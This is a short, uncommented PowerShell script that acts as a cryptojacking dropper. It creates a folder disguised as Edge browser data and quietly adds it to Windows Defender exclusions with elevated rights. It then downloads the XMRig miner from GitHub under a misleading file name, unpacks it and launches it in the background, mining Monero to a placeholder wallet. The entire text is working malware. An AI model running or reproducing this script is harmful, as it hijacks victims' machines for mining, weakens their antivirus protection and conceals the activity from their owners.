$XMR_ADDRESS = "<SOME_XMR_ADDRESS>"

if (-not (Test-Path "C:\Temp\EdgeBrowserData")) {
    New-Item -Path "C:\Temp\EdgeBrowserData" -ItemType Directory
}
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command Add-MpPreference -ExclusionPath 'C:\Temp\EdgeBrowserData' -Force" -WindowStyle Hidden -Verb RunAs
switch ($env:PROCESSOR_ARCHITECTURE) 
{
    "AMD64" { (New-Object System.Net.WebClient).DownloadFile("https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip", "edgebrowserdat.zip") }
    "x86" { (New-Object System.Net.WebClient).DownloadFile("https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip", "edgebrowserdat.zip") }
    "ARM64" { (New-Object System.Net.WebClient).DownloadFile("https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-arm64.zip", "edgebrowserdat.zip") } 
}
Move-Item -Path "edgebrowserdat.zip" -Destination "C:\Temp\EdgeBrowserData\" -Force
Expand-Archive -Path "C:\Temp\EdgeBrowserData\edgebrowserdat.zip" -DestinationPath "C:\Temp\EdgeBrowserData\" -Force
Start-Process -FilePath "C:\Temp\EdgeBrowserData\xmrig-6.24.0\xmrig.exe" -ArgumentList "--url gulf.moneroocean.stream:10128 --user $XMR_ADDRESS --pass x --coin monero --cpu-priority 1 --threads 2 --background" 
